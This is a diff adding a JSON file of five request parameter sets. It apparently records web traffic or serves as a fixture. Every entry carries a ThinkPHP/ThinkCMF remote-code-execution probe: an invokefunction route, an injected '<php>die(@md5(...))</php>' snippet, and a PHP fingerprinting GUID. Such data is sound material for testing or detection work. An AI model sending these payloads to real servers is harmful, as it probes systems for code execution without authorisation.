@@ -1,0 +1,62 @@
+[
+ {
+  "amp_cache_transform": "google;v=\"1..8\"",
+  "content": "<php>die(@md5(HelloThinkCMF))</php>",
+  "keep_alive": "300",
+  "param": "PHPE9568F36-D428-11d2-A769-00AA001ACF42",
+  "postman_token": "faf84c5a-f7df-48d7-95e9-bec9b527a438",
+  "r": "0.01231231230",
+  "s": "/Index/\\think\\app/invokefunction",
+  "vars_0_": "md5",
+  "x_datadog_parent_id": "17224552442365752148",
+  "x_datadog_trace_id": "2873245079675921149"
+ },
+ {
+  "amp_cache_transform": "google;v=\"1..8\"",
+  "content": "<php>die(@md5(HelloThinkCMF))</php>",
+  "keep_alive": "300",
+  "param": "PHPE9568F36-D428-11d2-A769-00AA001ACF42",
+  "postman_token": "faf84c5a-f7df-48d7-95e9-bec9b527a438",
+  "r": "0.01231231230",
+  "s": "/Index/\\think\\app/invokefunction",
+  "vars_0_": "__HelloThinkPHP",
+  "x_datadog_parent_id": "17224552442365752148",
+  "x_datadog_trace_id": "2873245079675921149"
+ },
+ {
+  "amp_cache_transform": "google;v=\"1..8\"",
+  "content": "<php>die(@md5(HelloThinkCMF))</php>",
+  "keep_alive": "300",
+  "param": "PHPE9568F36-D428-11d2-A769-00AA001ACF42",
+  "postman_token": "faf84c5a-f7df-48d7-95e9-bec9b527a438",
+  "r": "0.01231231230",
+  "s": "/Index/\\think\\app/invokefunction",
+  "vars_0_": "x4KNnCMm",
+  "x_datadog_parent_id": "17224552442365752148",
+  "x_datadog_trace_id": "2873245079675921149"
+ },
+ {
+  "amp_cache_transform": "google;v=\"1..8\"",
+  "content": "<php>die(@md5(HelloThinkCMF))</php>",
+  "keep_alive": "300",
+  "param": "PHPE9568F36-D428-11d2-A769-00AA001ACF42",
+  "postman_token": "faf84c5a-f7df-48d7-95e9-bec9b527a438",
+  "r": "0.01231231230",
+  "s": "/Index/\\think\\app/invokefunction",
+  "vars_0_": "ra60CskQ",
+  "x_datadog_parent_id": "17224552442365752148",
+  "x_datadog_trace_id": "2873245079675921149"
+ },
+ {
+  "amp_cache_transform": "google;v=\"1..8\"",
+  "content": "<php>die(@md5(HelloThinkCMF))</php>",
+  "keep_alive": "300",
+  "param": "PHPE9568F36-D428-11d2-A769-00AA001ACF42",
+  "postman_token": "faf84c5a-f7df-48d7-95e9-bec9b527a438",
+  "r": "0.01231231230",
+  "s": "/Index/\\think\\app/invokefunction",
+  "vars_0_": "tMeGL0pH",
+  "x_datadog_parent_id": "11614822681289147485",
+  "x_datadog_trace_id": "15469798019589103194"
+ }
+]
